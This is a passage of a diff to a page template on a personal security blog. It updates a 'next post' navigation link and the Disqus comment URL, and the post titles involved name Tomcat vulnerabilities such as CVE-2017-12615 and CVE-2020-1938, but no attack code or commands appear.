-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/13/badsub%E5%88%B6%E4%BD%9C/" title="badsub制作">
-                        <span class="hidden-mobile">badsub制作</span>
+                      <a href="/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%89/" title="通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615)">
+                        <span class="hidden-mobile">通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -444,8 +455,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/';
-          this.page.identifier = '/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/';
+          this.page.url = 'https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&amp;&amp;%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/';
+          this.page.identifier = '/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&amp;&amp;%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
